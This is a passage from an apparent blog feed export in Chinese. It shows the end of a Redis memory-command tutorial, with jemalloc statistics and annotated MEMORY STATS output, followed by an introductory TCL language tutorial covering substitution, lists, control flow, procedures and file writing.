4096<br>Min active:dirty page ratio per arena: 8:1<br>Maximum thread-cached size class: 32768<br>Chunk size: 4194304 (2^22)<br>Allocated: 5948968, active: 6402048, mapped: 20971520<br>Current active ceiling: 12582912<br>chunks: nchunks   highchunks    curchunks<br>              5            5            5<br>huge: nmalloc      ndalloc    allocated<br>            0            0            0<br><br>Merged arenas stats:<br>assigned threads: 2<br>dss allocation precedence: N/A<br>dirty pages: 1563:0 active:dirty, 5 sweeps, 4 madvises, 386 purged<br>            allocated      nmalloc      ndalloc    nrequests<br>small:         501288        12362         1272       283989<br>large:        5447680           12            4           14<br>total:        5948968        12374         1276       284003<br>active:       6402048<br>mapped:      12582912<br>bins:     bin  size regs pgs    allocated      nmalloc      ndalloc    nrequests       nfills     nflushes      newruns       reruns      curruns<br>            0     8  501   1           40          109          104          100            3            6            1            0            1<br>            1    16  252   1       164336        10372          101       282735          114            9           41            0           41<br>            2    32  126   1        14432          604          153          751           25           10            5            7            4<br>            3    48   84   1         1200           99           74          181            4            9            1            0            1<br>            4    64   63   1          640           80           70           56            4            6            1            0            1<br>            5    80   50   1         1760           80           58           23            5            6            1            0            1<br>            6    96   84   2         8544          119           30           94            7            7            2            0            2<br>            7   112   72   2          448           80           76            6            3            6            1            0            1<br>            8   128   63   2          768           76           70           19            6            9            1            0            1<br>[9..10]<br>           11   224   72   4          448           78           76            2            3            6            3            0            1<br>           12   256   63   4          768           72           69            6            4            6            4            0            1<br>[13..14]<br>           15   448   63   7        28224           63            0            0            1            0            1            0            1<br>           16   512   63   8         1536           69           66            4            3            5            3            0            1<br>           17   640   51   8            0           51           51            1            1            3            1            0            0<br>           18   768   47   9          768           47           46            1            1            3            1            0            1<br>           19   896   45  10        40320           45            0            0            1            0            1            0            1<br>           20  1024   63  16         1024           67           66            4            3            6            2            0            1<br>[21]<br>           22  1536   42  16            0           47           47            2            2            5            2            0            0<br>           23  1792   38  17        68096           38            0            0            1            0            1            0            1<br>           24  2048   65  33        10240           69           64            2            2            4            1            0            1<br>           25  2560   52  33        17920           58           51            2            2            3            1            0            1<br>[26]<br>           27  3584   39  35       139776           39            0            0            1            0            1            0            1<br>large:   size pages      nmalloc      ndalloc    nrequests      curruns<br>[1]<br>         8192     2            5            3            7            2<br>[1]<br>        16384     4            2            0            2            2<br>[3]<br>        32768     8            2            0            2            2<br>[292]<br>      1232896   301            1            0            1            1<br>[30]<br>      1359872   332            1            1            1            0<br>[668]<br>      4100096  1001            1            0            1            1<br>[17]<br><br>arenas[0]:<br>assigned threads: 1<br>dss allocation precedence: disabled<br>dirty pages: 1554:0 active:dirty, 3 sweeps, 4 madvises, 386 purged<br>            allocated      nmalloc      ndalloc    nrequests<br>small:         498088        12262         1272       283989<br>large:        5414912           11            4           13<br>total:        5913000        12273         1276       284002<br>active:       6365184<br>mapped:       8388608<br>bins:     bin  size regs pgs    allocated      nmalloc      ndalloc    nrequests       nfills     nflushes      newruns       reruns      curruns<br>            0     8  501   1           40          109          104          100            3            6            1            0            1<br>            1    16  252   1       164336        10372          101       282735          114            9           41            0           41<br>            2    32  126   1        11232          504          153          751           24           10            4            7            3<br>            3    48   84   1         1200           99           74          181            4            9            1            0            1<br>            4    64   63   1          640           80           70           56            4            6            1            0            1<br>            5    80   50   1         1760           80           58           23            5            6            1            0            1<br>            6    96   84   2         8544          119           30           94            7            7            2            0            2<br>            7   112   72   2          448           80           76            6            3            6            1            0            1<br>            8   128   63   2          768           76           70           19            6            9            1            0            1<br>[9..10]<br>           11   224   72   4          448           78           76            2            3            6            3            0            1<br>           12   256   63   4          768           72           69            6            4            6            4            0            1<br>[13..14]<br>           15   448   63   7        28224           63            0            0            1            0            1            0            1<br>           16   512   63   8         1536           69           66            4            3            5            3            0            1<br>           17   640   51   8            0           51           51            1            1            3            1            0            0<br>           18   768   47   9          768           47           46            1            1            3            1            0            1<br>           19   896   45  10        40320           45            0            0            1            0            1            0            1<br>           20  1024   63  16         1024           67           66            4            3            6            2            0            1<br>[21]<br>           22  1536   42  16            0           47           47            2            2            5            2            0            0<br>           23  1792   38  17        68096           38            0            0            1            0            1            0            1<br>           24  2048   65  33        10240           69           64            2            2            4            1            0            1<br>           25  2560   52  33        17920           58           51            2            2            3            1            0            1<br>[26]<br>           27  3584   39  35       139776           39            0            0            1            0            1            0            1<br>large:   size pages      nmalloc      ndalloc    nrequests      curruns<br>[1]<br>         8192     2            5            3            7            2<br>[1]<br>        16384     4            2            0            2            2<br>[3]<br>        32768     8            1            0            1            1<br>[292]<br>      1232896   301            1            0            1            1<br>[30]<br>      1359872   332            1            1            1            0<br>[668]<br>      4100096  1001            1            0            1            1<br>[17]<br><br>arenas[1]:<br>assigned threads: 1<br>dss allocation precedence: disabled<br>dirty pages: 9:0 active:dirty, 2 sweeps, 0 madvises, 0 purged<br>            allocated      nmalloc      ndalloc    nrequests<br>small:           3200          100            0            0<br>large:          32768            1            0            1<br>total:          35968          101            0            1<br>active:         36864<br>mapped:       4194304<br>bins:     bin  size regs pgs    allocated      nmalloc      ndalloc    nrequests       nfills     nflushes      newruns       reruns      curruns<br>[0..1]<br>            2    32  126   1         3200          100            0            0            1            0            1            0            1<br>[3..27]<br>large:   size pages      nmalloc      ndalloc    nrequests      curruns<br>[7]<br>        32768     8            1            0            1            1<br>[1010]<br>--- End jemalloc statistics ---<br></code></pre></td></tr></table></figure><p>执行结果说明：无，待补充</p><h3 id="2-3、MEMORY-PURGE"><a href="#2-3、MEMORY-PURGE" class="headerlink" title="2.3、MEMORY PURGE"></a>2.3、MEMORY PURGE</h3><p><strong>使用方式：</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">memory purge<br></code></pre></td></tr></table></figure><p>该指令通过调用<code>jemalloc</code>的内部命令尽量把<code>redis</code>进程占用但未有效使用内存释放，即常说的内存碎片释放给操作系统（只适用于使用jemalloc作为allocator的实例）；</p><h3 id="2-4、MEMORY-STATS"><a href="#2-4、MEMORY-STATS" class="headerlink" title="2.4、MEMORY STATS"></a>2.4、MEMORY STATS</h3><p><strong>使用方式：</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">memory stats<br></code></pre></td></tr></table></figure><p>在 redis 4.0 之前，只能通过<code>info memory</code>查看redis实例的内存大体使用状况，而无法了解内存的具体使用细节，比如<code>expire的消耗</code>，<code>client output buffer</code>, <code>query buffer</code>等是很难直观显示的。该指令能够展现<code>redis</code>内部内存使用细节；</p><p><strong>执行结果示例及对应参数解析：</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"> 1) <span class="hljs-string">&quot;peak.allocated&quot;</span> <span class="hljs-comment"># redis从启动来，allocator分配的内存峰值</span><br> 2) (<span class="hljs-built_in">integer</span>) 2290242368<br> 3) <span class="hljs-string">&quot;total.allocated&quot;</span> <span class="hljs-comment"># allocator分配当前内存字节数</span><br> 4) (<span class="hljs-built_in">integer</span>) 2290241776<br> 5) <span class="hljs-string">&quot;startup.allocated&quot;</span> <span class="hljs-comment"># redis启动完成使用的内存字节数</span><br> 6) (<span class="hljs-built_in">integer</span>) 6315320<br> 7) <span class="hljs-string">&quot;clients.normal&quot;</span> <span class="hljs-comment"># 所有一般客户端消耗内存节字数,即所有flag为N的客户端内存使用</span><br> 8) (<span class="hljs-built_in">integer</span>) 150754<br> 9) <span class="hljs-string">&quot;aof.buffer&quot;</span> <span class="hljs-comment"># aof buffer使用内存字节数，一般较小，在aof rewrite时会变得较大</span><br>10) (<span class="hljs-built_in">integer</span>) 0<br>11) <span class="hljs-string">&quot;lua.caches&quot;</span> <span class="hljs-comment"># 所有lua脚本占用的内存节字数</span><br>12) (<span class="hljs-built_in">integer</span>) 0<br>13) <span class="hljs-string">&quot;db.0&quot;</span><br>14) 1) <span class="hljs-string">&quot;overhead.hashtable.main&quot;</span> <span class="hljs-comment"># 对应db的所有key的hash表总的内存节字数</span><br>    2) (<span class="hljs-built_in">integer</span>) 680720488<br>    3) <span class="hljs-string">&quot;overhead.hashtable.expires&quot;</span> <span class="hljs-comment"># 对应db的过期key的hash表总的内存节字数</span><br>    4) (<span class="hljs-built_in">integer</span>) 416<br>15) <span class="hljs-string">&quot;overhead.total&quot;</span> <span class="hljs-comment"># redis总的分配的内存的字节数</span><br>16) (<span class="hljs-built_in">integer</span>) 687186978<br>17) <span class="hljs-string">&quot;keys.count&quot;</span> <span class="hljs-comment"># 整个实例key的个数，相同于dbsize返回值</span><br>18) (<span class="hljs-built_in">integer</span>) 13662569<br>19) <span class="hljs-string">&quot;keys.bytes-per-key&quot;</span> <span class="hljs-comment"># 每个key平均占用字节数；把overhead也均摊到每个key上</span><br>20) (<span class="hljs-built_in">integer</span>) 167<br>21) <span class="hljs-string">&quot;dataset.bytes&quot;</span> <span class="hljs-comment"># 表示redis数据集占用的内存容量，即分配的内存总量减去 overhead.total</span><br>22) (<span class="hljs-built_in">integer</span>) 1603054798<br>23) <span class="hljs-string">&quot;dataset.percentage&quot;</span> <span class="hljs-comment"># 表示redis数据占用内存占总内存分配的百分比</span><br>24) <span class="hljs-string">&quot;70.188545227050781&quot;</span><br>25) <span class="hljs-string">&quot;peak.percentage&quot;</span> <span class="hljs-comment"># 当前内存使用量在峰值时的占比</span><br>26) <span class="hljs-string">&quot;99.999977111816406&quot;</span><br>27) <span class="hljs-string">&quot;allocator.allocated&quot;</span> <span class="hljs-comment"># 该参数不同与 total.allocated, 它计算所有分配的内存大小（不仅仅是使用zmalloc分配的）</span><br>28) (<span class="hljs-built_in">integer</span>) 2291632296<br>29) <span class="hljs-string">&quot;allocator.active&quot;</span> <span class="hljs-comment"># 与常驻内存allocator.resident不同，这不包括jemalloc申请的还未使用的内存</span><br>30) (<span class="hljs-built_in">integer</span>) 2293006336<br>31) <span class="hljs-string">&quot;allocator.resident&quot;</span> <span class="hljs-comment"># 与RSS不同，这不包括来自共享库和其他非堆映射的RSS</span><br>32) (<span class="hljs-built_in">integer</span>) 2340564992<br>33) <span class="hljs-string">&quot;allocator-fragmentation.ratio&quot;</span> <span class="hljs-comment"># 等于 allocator.active / allocator.allocated</span><br>34) <span class="hljs-string">&quot;1.0005995035171509&quot;</span><br>35) <span class="hljs-string">&quot;allocator-fragmentation.bytes&quot;</span> <span class="hljs-comment"># 等于 allocator.active - allocator.allocated</span><br>36) (<span class="hljs-built_in">integer</span>) 1374040<br>37) <span class="hljs-string">&quot;allocator-rss.ratio&quot;</span> <span class="hljs-comment"># 等于 allocator.resident / allocator.active</span><br>38) <span class="hljs-string">&quot;1.0207407474517822&quot;</span><br>39) <span class="hljs-string">&quot;allocator-rss.bytes&quot;</span> <span class="hljs-comment"># 等于 allocator.resident - allocator.active</span><br>40) (<span class="hljs-built_in">integer</span>) 47558656<br>41) <span class="hljs-string">&quot;rss-overhead.ratio&quot;</span> <span class="hljs-comment"># 等于 RSS / allocator.resident</span><br>42) <span class="hljs-string">&quot;0.99930697679519653&quot;</span><br>43) <span class="hljs-string">&quot;rss-overhead.bytes&quot;</span> <span class="hljs-comment"># 等于 RSS - allocator.resident</span><br>44) (<span class="hljs-built_in">integer</span>) -1622016<br>45) <span class="hljs-string">&quot;fragmentation&quot;</span> <span class="hljs-comment"># 等于 RSS / total.allocated</span><br>46) <span class="hljs-string">&quot;1.0212923288345337&quot;</span><br>47) <span class="hljs-string">&quot;fragmentation.bytes&quot;</span> <span class="hljs-comment"># 等于 RSS - total.allocated</span><br>48) (<span class="hljs-built_in">integer</span>) 48763208<br></code></pre></td></tr></table></figure><h3 id="2-5、MEMORY-USAGE-key-SAMPLES-count"><a href="#2-5、MEMORY-USAGE-key-SAMPLES-count" class="headerlink" title="2.5、MEMORY USAGE key [SAMPLES count]"></a>2.5、MEMORY USAGE key [SAMPLES count]</h3><p><strong>使用方式</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 针对全部key</span><br>memory usage k1<br><span class="hljs-comment"># 针对编码使用 REDIS_ENCODING_HT 和 REDIS_ENCODING_SKIPLIST 的另一种方式</span><br><span class="hljs-comment"># 采样10个元素近似估算整个value的实际内存占用</span><br>memory usage tk samples 10<br><br></code></pre></td></tr></table></figure><p><strong>其他特点：</strong></p><ul><li>只计算value对应的内存估计值，key不存在返回nil；</li><li>如果key存在过期，不包含Key Expire的内存占用；</li><li>对于编码类型为<code>REDIS_ENCODING_HT</code>和<code>REDIS_ENCODING_SKIPLIST</code>，usage子命令采用类似<code>LRU SAMPLES</code>的抽样方式，默认抽样5个元素求平均 X 元数个数 得出实际内存占用，计算结果是近似值，当面可以指定抽样的SAMPLES个数；</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TCL语言入门</title>
      <link href="/2019/01/13/tcl-first/"/>
      <url>/2019/01/13/tcl-first/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简述"><a href="#一、简述" class="headerlink" title="一、简述"></a>一、简述</h2><p>Tcl是一种很通用的脚本语言，它几乎在所有的平台上都可以释运行，一条TCL的命令串包含若干条命令，命令使用换行符或分号来隔开；而每一条命令包含若干个域(field)，域使用空白（空格或TAB）来隔开——第一个域是命令的名字，其它的域是该命令的参数。</p><h2 id="二、基本语法"><a href="#二、基本语法" class="headerlink" title="二、基本语法"></a>二、基本语法</h2><h3 id="2-1、注释"><a href="#2-1、注释" class="headerlink" title="2.1、注释"></a>2.1、注释</h3><p>注释在调试的过程中轻常碰到。TCL语言的注释符号是 <code>#</code> ，加在每一行的最前面。</p><h3 id="2-2、脚本、命令、单词"><a href="#2-2、脚本、命令、单词" class="headerlink" title="2.2、脚本、命令、单词"></a>2.2、脚本、命令、单词</h3><p>一个TCL <code>脚本</code> 可以包含一个或多个 <code>命令</code> 。 <code>命令</code> 之间必须用换行符或分号隔开，推荐使用换行符分开。下面就是一个合法的TCL <code>脚本</code> ，它由两个赋值 <code>命令</code> 组成；</p><figure class="highlight tcl"><table><tr><td class="code"><pre><code class="hljs tcl"><span class="hljs-keyword">set</span> a <span class="hljs-number">1</span><br><span class="hljs-keyword">set</span> b <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>TCL的每一个 <code>命令</code> 包含一个或几个 <code>单词</code>，第一个单词代表命令名，另外的单词则是这个命令的参数，单词之间必须用 <code>空格</code> 或 <code>TAB键</code> 隔开。上面代码中的 <code>set</code> ， <code>a</code> ， <code>1</code> 分别是三个单词。</p><p>TCL解释器对一个 <code>命令</code> 的求值过程分为两部分：分析和执行；</p><ul><li>在分析阶段，TCL 解释器运用规则把 <code>命令</code> 分成一个个独立的单词，同时进行必要的 <code>置换(substitution)</code> ； </li><li>在执行阶段，TCL 解释器会把第一个单词当作 <code>命令名</code> ，并查看这个命令是否有定义，如果有定义就激活这个命令对应的 C&#x2F;C++ 过程，并把所有的单词作为参数传递给该命令过程，让命令过程进行处理；</li></ul><h3 id="2-3、置换-substitution"><a href="#2-3、置换-substitution" class="headerlink" title="2.3、置换(substitution)"></a>2.3、置换(substitution)</h3><p>TCL解释器在分析命令时，把所有的命令参数都当作字符串看待，例如：</p><figure class="highlight tcl"><table><tr><td class="code"><pre><code class="hljs tcl">OpenSees &gt; <span class="hljs-keyword">set</span> x <span class="hljs-number">10</span><br><span class="hljs-number">10</span><br>OpenSees &gt; <span class="hljs-keyword">set</span> y x+<span class="hljs-number">1</span><br>x+<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>上例的第二个命令中，<code>x </code>被看作字符串 <code>x+1</code> 的一部分，此时y的值为 <code>x+1</code> 如果我们想使用x的值<code>10</code> ，就必须告诉<code>TCL</code>解释器：我们在这里期望的是变量x的值，而非字符<code>x</code>。怎么告诉<code>TCL</code>解释器呢，这就要用到TCL语言中提供的 <code>置换</code> 功能。<code>TCL</code>提供三种形式的置换： <code>变量置换</code> 、 <code>命令置换</code> 和 <code>反斜杠置换</code> ；</p><ul><li><strong><code>变量置换</code></strong>：在变量符号之前用 <code>$</code> 符号标记。这会导致变量的值插入一个单词中；</li></ul><figure class="highlight tcl"><table><tr><td class="code"><pre><code class="hljs tcl">OpenSees &gt; <span class="hljs-keyword">set</span> y <span class="hljs-variable">$x</span>+<span class="hljs-number">1</span><br><span class="hljs-number">10</span>+<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>这里x的值已经被替换成 <code>10</code> ，但是没有执行我们想要的 <code>x+1</code> 计算。这时就要用到命令置换。</p><ul><li><strong><code>命令置换</code></strong>：由 <code>[]</code> 括起来的TCL命令及其参数，命令置换会导致某一个命令的所有或部分单词被另一个命令的结果所代替，当使用 <code>expr</code> 作为<code>TCL</code>命令的时候，支持如下常用运算，例如：<ul><li><code>+</code> 、 <code>-</code> 、 <code>*</code> 、 <code>/</code> ：加减乘除；</li><li><code>&gt;</code> 、 <code>&lt;</code> 、 <code>&lt;=</code> 、 <code>&gt;=</code> 、 <code>==</code> 、 <code>!=</code> ：布尔运算</li><li><code>abs()</code> 、 <code>sin()</code> 、 <code>pow()</code> 、 <code>exp()</code>：常用数学函数</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">OpenSees &gt; set y [expr $x+1]<br>11<br></code></pre></td></tr></table></figure><ul><li><strong><code>反斜杠置换</code></strong>：TCL语言中的反斜杠置换类似于C语言中反斜杠的用法，主要用于在单词符号中插入诸如换行符、空格、[]、$等被TCL解释器当作特殊符号对待的字符。例如：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">OpenSees &gt; set msg multiple\ space<br>multiple space<br></code></pre></td></tr></table></figure><p>如果没有 <code>\</code> 的话，TCL会报错，因为解释器会把这里最后两个单词之间的空格认为是分隔符，于是发现set命令有多于两个参数，从而报错。加入了 <code>\</code> 后，空格不被当作分隔符，<code>multiple space</code> 被认为是一个 <code>单词</code>。</p><p>TCL支持以下反斜杠置换：</p><table><thead><tr><th align="center">Backslash Sequence</th><th align="center">Replaced By</th></tr></thead><tbody><tr><td align="center">\a</td><td align="center">Audible alert (0x7) 响铃</td></tr><tr><td align="center">\b</td><td align="center">Backspace (0x8)  退格</td></tr><tr><td align="center">\f</td><td align="center">Form feed (0xc) 换页</td></tr><tr><td align="center">\n 或 \newline</td><td align="center">Newline (0xa) 新行</td></tr><tr><td align="center">\r</td><td align="center">Carriage return (0xd) 回车</td></tr><tr><td align="center">\t</td><td align="center">Tab (0x9) 水平制表</td></tr><tr><td align="center">\v</td><td align="center">Vertical tab (0xb) 垂直制表</td></tr><tr><td align="center">\ddd</td><td align="center">Octal value given by ddd 八进制值</td></tr><tr><td align="center">\xhh</td><td align="center">Hex value given by hh 十六进制值</td></tr><tr><td align="center">\ newline space</td><td align="center">A single space character. 空格</td></tr></tbody></table><h3 id="2-4、双引号和花括号"><a href="#2-4、双引号和花括号" class="headerlink" title="2.4、双引号和花括号"></a>2.4、双引号和花括号</h3><p>除了使用反斜杠外，TCL提供另外两种方法来使得解释器把分隔符和置换符等特殊字符当作普通字符，而不作特殊处理，这就要使用双引号和花括号({})。</p><p>TCL解释器对双引号中的各种分隔符将不作处理，但是对换行符 及＄和[]两种置换符会照常处理。例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">OpenSees &gt; set  x  100<br>100<br>OpenSees &gt; set  y  &quot;$x   ddd&quot;<br>100   ddd<br></code></pre></td></tr></table></figure><p>而在花括号中，所有特殊字符都将成为普通字符，失去其特殊意义，TCL解释器不会对其作特殊处理。</p><figure class="highlight tcl"><table><tr><td class="code"><pre><code class="hljs tcl">OpenSees &gt; <span class="hljs-keyword">set</span>  y &#123;/n<span class="hljs-variable">$x</span>   [<span class="hljs-keyword">expr</span> <span class="hljs-number">10</span>+<span class="hljs-number">100</span>]&#125;<br>/n<span class="hljs-variable">$x</span>   [<span class="hljs-keyword">expr</span> <span class="hljs-number">10</span>+<span class="hljs-number">100</span>]<br></code></pre></td></tr></table></figure><h3 id="2-5、变量"><a href="#2-5、变量" class="headerlink" title="2.5、变量"></a>2.5、变量</h3><p>TCL的变量有两种，分别是简单变量和数组。</p><ul><li><strong>简单变量</strong>：一个TCL的简单变量包含两个部分：名字和值。名字和值都可以是任意字符串。变量推荐使用字母，数字与下划线的组合来命名。 TCL解释器在分析一个变量置换时，只把从＄符号往后直到第一个不是字母、数字或下划线的字符之间的单词符号作为要被置换的变量的名字。例如:</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">OpenSees &gt; set mat_tag 2<br>2<br></code></pre></td></tr></table></figure><p>TCL中的set命令能生成一个变量、也能读取或改变一个变量的值。如果变量 <code>mat_tag</code> 还没有定义，这个命令将生成该变量，并将其值置为 <code>2</code> ，若 <code>mat_tag</code> 已定义，就简单的把 <code>mat_tag</code> 的值置为 <code>2</code> 。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">OpenSees &gt; set mat_tag<br>2<br></code></pre></td></tr></table></figure><p>这个只有一个参数的set命令读取 <code>mat_tag</code> 的当前值 <code>2</code> 。</p><ul><li><strong>数组</strong>：在TCL中，数组是带有字符串值索引的变量，请注意，是字符串索引，而不是数字索引。由于TCL语言的这个特性，导致其数组的声明和引用都不是很方便。在OpenSees编程时，建议使用 <code>列表(List)</code> 。</li></ul><h3 id="2-6、列表"><a href="#2-6、列表" class="headerlink" title="2.6、列表"></a>2.6、列表</h3><p>TCL中列表(list)是由一堆元素组成的 <strong>有序</strong> 集合，list可以嵌套定义，list每个元素可以是任意字符串，也可以是list。下面都是TCL中的合法的list：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&#125;    //空list<br>&#123;a b c d&#125;<br>&#123;a &#123;b c&#125; d&#125; //list可以嵌套<br></code></pre></td></tr></table></figure><p>list是TCL中比较重要的一种数据结构，对于编写复杂的脚本有很大的帮助，TCL提供了很多基本命令对list进行操作，下面一一介绍：</p><h4 id="2-6-1、list命令"><a href="#2-6-1、list命令" class="headerlink" title="2.6.1、list命令"></a>2.6.1、list命令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">list ? value value...?<br></code></pre></td></tr></table></figure><p>这个命令生成一个list，list的元素就是所有的value。例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">OpenSees &gt; list 1 2 &#123;3 4&#125;<br>1 2 &#123;3 4&#125;<br></code></pre></td></tr></table></figure><h4 id="2-6-2、concat命令"><a href="#2-6-2、concat命令" class="headerlink" title="2.6.2、concat命令"></a>2.6.2、concat命令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">concat list ?list...?<br></code></pre></td></tr></table></figure><p>这个命令把多个list合成一个list，每个list变成新list的一个元素。</p><h4 id="2-6-3、lindex命令"><a href="#2-6-3、lindex命令" class="headerlink" title="2.6.3、lindex命令"></a>2.6.3、lindex命令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">lindex list index<br></code></pre></td></tr></table></figure><p>返回list的第index个(0-based)元素。例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">OpenSees &gt; lindex  &#123;1 2 &#123;3 4&#125;&#125; 2<br>3 4<br></code></pre></td></tr></table></figure><h4 id="2-6-4-、lappend命令"><a href="#2-6-4-、lappend命令" class="headerlink" title="2.6.4 、lappend命令"></a>2.6.4 、lappend命令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">lappend varname value ?value...?<br></code></pre></td></tr></table></figure><p>把每个value的值作为一个元素附加到变量varname后面，并返回变量的新值，如果varname不存在，就生成这个变量。例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">OpenSees &gt; lappend  a  1 2 3<br>1 2 3<br>OpenSees &gt; set a<br>1 2 3<br></code></pre></td></tr></table></figure><h2 id="三、控制流"><a href="#三、控制流" class="headerlink" title="三、控制流"></a>三、控制流</h2><p>TCL中的控制流和C语言类似，包括if、while、for、foreach、switch、break、continue等命令。下面分别介绍。</p><h3 id="3-1、if命令"><a href="#3-1、if命令" class="headerlink" title="3.1、if命令"></a>3.1、if命令</h3><p>单个if命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">if &#123; $x&gt;0 &#125; &#123;<br>  ...<br>&#125;<br></code></pre></td></tr></table></figure><p>if-else组合命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">if &#123; $x&gt;0 &#125; &#123;<br>  ...<br>&#125; elseif &#123; $x&lt;-2 &#125; &#123;<br>  ...<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-2、while命令"><a href="#3-2、while命令" class="headerlink" title="3.2、while命令"></a>3.2、while命令</h3><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">while  &#123; $x&gt;0 &#125;  &#123;<br>  ...<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-3、for命令"><a href="#3-3、for命令" class="headerlink" title="3.3、for命令"></a>3.3、for命令</h3><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">for &#123;set i 0&#125;  &#123; $i&lt;10 &#125;  &#123;incr i 2&#125; &#123;<br>  ...<br>&#125;<br></code></pre></td></tr></table></figure><p>for后面加三个花括号。与C语言中的for命令类似，第一个花括号中初始化变量的值，示例中为变量 <code>i</code> 赋初值 <code>0</code> ，第二个花括号中为循环进行下去的条件。示例中如果不满足 <code>$i&lt;10</code> 这一条件就会退出循环。第三个花括号中为每次循环后要执行的语句，示例中对变量 <code>i</code> 的值加2。</p><h3 id="3-4、foreach命令"><a href="#3-4、foreach命令" class="headerlink" title="3.4、foreach命令"></a>3.4、foreach命令</h3><p>示例1：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">foreach i  &#123;a b c d&#125; &#123;<br>  ...<br>&#125;<br></code></pre></td></tr></table></figure><p>这一语句循环4次，循环体中i的值分别为 <code>a</code> ， <code>b</code> ， <code>c</code> ， <code>d</code> 。</p><h2 id="四、source命令"><a href="#四、source命令" class="headerlink" title="四、source命令"></a>四、source命令</h2><p>source命令读一个文件并把这个文件的内容作为一个脚本进行求值。例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">source e:/hello.TCL<br></code></pre></td></tr></table></figure><p>注意这里的路径采用的是 <code>/</code> 而不是Windows中的 <code>\</code> 。</p><h2 id="五、过程-procedure"><a href="#五、过程-procedure" class="headerlink" title="五、过程(procedure)"></a>五、过程(procedure)</h2><p>TCL支持过程的定义和调用，在TCL中,过程可以看作是用TCL脚本实现的命令，效果与TCL的固有命令相似。我们可以在任何时候使用proc命令定义自己的过程，TCL中的过程类似于C中的函数。</p><p>在OpenSees脚本中，使用过程可以把一部分语句 <code>封装</code> 起来，方便多次引用。建议多使用过程。</p><p>TCL中过程是由proc命令产生的。示例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">proc add &#123;x y&#125; &#123;<br>    expr $x+$y<br>&#125;<br></code></pre></td></tr></table></figure><p>proc命令的第一个参数是你要定义的过程的名字，第二个参数是过程的参数列表，参数之间用空格隔开，第三个参数是一个TCL脚本，代表过程体。proc生成一个新的命令，可以象固有命令一样调用：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">OpenSees &gt; add 1 2<br>3<br></code></pre></td></tr></table></figure><p>在定义过程时，你可以利用return命令在任何地方返回你想要的值。 return命令迅速中断过程，并把它的参数作为过程的结果。例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">proc abs &#123;x&#125; &#123;<br>    if &#123;$x &gt;= 0&#125; &#123; return $x &#125;<br>    return [expr -$x]<br>&#125;<br></code></pre></td></tr></table></figure><p>过程的返回值是过程体中最后执行的那条命令的返回值。可以用如下方法调用：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">OpenSees &gt; set a [abs -3]<br>3<br></code></pre></td></tr></table></figure><h2 id="六、文件读写"><a href="#六、文件读写" class="headerlink" title="六、文件读写"></a>六、文件读写</h2><p>TCL提供了丰富的文件操作的命令。通过这些命令你可以对文件名进行操作(查找匹配某一模式的文件)、以顺序或随机方式读写文件、检索系统保留的文件信息（如最后访问时间)。</p><h3 id="6-1、文件名"><a href="#6-1、文件名" class="headerlink" title="6.1、文件名"></a>6.1、文件名</h3><p>TCL中文件名和我们熟悉的windows表示文件的方法有一些区别：在表示文件的目录结构时它使用 <code>/</code> ，而不是 <code>\</code> ，这和TCL最初是在UNIX下实现有关。比如C盘TCL目录下的文件sample.TCL在TCL中这样表示： <code>C:/TCL/sample.TCL</code> 。</p><h3 id="6-2、写文件示例"><a href="#6-2、写文件示例" class="headerlink" title="6.2、写文件示例"></a>6.2、写文件示例</h3><p>所以本教程中只介绍写文件的方法。如果想要了解读取文件的方法，请参考 <a href="http://www.tcl.tk/man/TCL/TCLCmd/open.htm">TCL文件读写文档</a> 。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">set f [open hello.txt w]<br>puts $f &quot;Hello, world!&quot;<br>close $f<br></code></pre></td></tr></table></figure><h3 id="6-3、open命令"><a href="#6-3、open命令" class="headerlink" title="6.3、open命令"></a>6.3、open命令</h3><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">open &quot;hello.txt&quot; &quot;r&quot;<br></code></pre></td></tr></table></figure><p>open命令 